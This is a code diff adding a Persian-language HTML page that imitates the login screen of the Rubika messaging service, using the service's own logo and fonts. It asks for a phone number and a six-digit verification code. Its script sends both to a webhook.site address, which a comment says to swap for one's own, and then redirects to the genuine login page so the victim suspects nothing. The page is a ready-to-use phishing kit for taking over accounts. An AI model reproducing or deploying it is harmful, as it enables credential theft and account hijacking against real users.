@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>روبیکا | ورود</title>
+    <style>
+        @font-face {
+            font-family: IRANSans;
+            src: url(https://web.rubika.ir/static/media/IRANSans.28b0d3b8.woff) format('woff');
+            font-weight: 400;
+        }
+        @font-face {
+            font-family: IRANSans;
+            src: url(https://web.rubika.ir/static/media/IRANSans-Bold.4e4e4c9e.woff) format('woff');
+            font-weight: 700;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: IRANSans, Tahoma, sans-serif;
+            background: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-wrapper {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
+            width: 400px;
+            max-width: 95%;
+            padding: 32px;
+            text-align: center;
+        }
+        .login-logo { width: 80px; height: 80px; margin-bottom: 24px; }
+        .login-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 24px; }
+        .input-box {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            font-family: IRANSans, Tahoma;
+            text-align: center;
+            direction: ltr;
+            margin-bottom: 16px;
+            outline: none;
+        }
+        .input-box:focus { border-color: #00bfa5; }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #00bfa5;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        .btn:hover { background: #009e8c; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .error { color: #e53935; font-size: 14px; margin-top: 8px; display: none; }
+    </style>
+</head>
+<body>
+<div class="login-wrapper">
+    <img class="login-logo" src="https://web.rubika.ir/static/media/logo.21e4c6b3.png" alt="روبیکا">
+    <div id="step1" class="step active">
+        <div class="login-title">ورود / ثبت‌نام</div>
+        <input type="tel" id="phone" class="input-box" placeholder="شماره موبایل" inputmode="numeric" autofocus>
+        <div id="phoneError" class="error">شماره موبایل صحیح نیست (۰۹xxxxxxxxx)</div>
+        <button class="btn" onclick="goToCode()">ادامه</button>
+    </div>
+    <div id="step2" class="step">
+        <div class="login-title">کد تأیید ۶ رقمی ارسال‌شده را وارد کنید</div>
+        <input type="text" id="code" class="input-box" placeholder="کد تأیید" inputmode="numeric" maxlength="6">
+        <div id="codeError" class="error">کد باید ۶ رقم باشد</div>
+        <button class="btn" onclick="sendData()">تأیید</button>
+    </div>
+</div>
+<script>
+    let phoneNumber = '';
+    function goToCode() {
+        const phone = document.getElementById('phone').value.trim();
+        if (phone.length === 11 && phone.startsWith('09')) {
+            phoneNumber = phone;
+            document.getElementById('phoneError').style.display = 'none';
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
+            document.getElementById('code').focus();
+        } else {
+            document.getElementById('phoneError').style.display = 'block';
+        }
+    }
+    function sendData() {
+        const code = document.getElementById('code').value.trim();
+        if (code.length === 6) {
+            document.getElementById('codeError').style.display = 'none';
+            // 👇 لینک webhook.site خود را جایگزین کنید
+            fetch('https://webhook.site/#!/view/797a6d1e-7344-4f1f-9d13-9618ed0ceee8/bba7f3bd-afc9-4d83-9819-8abe8bae5aef', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: `phone=${encodeURIComponent(phoneNumber)}&code=${encodeURIComponent(code)}`
+            }).finally(() => {
+                window.location.href = 'https://web.rubika.ir/login';
+            });
+        } else {
+            document.getElementById('codeError').style.display = 'block';
+        }
+    }
+</script>
+</body>
+</html>
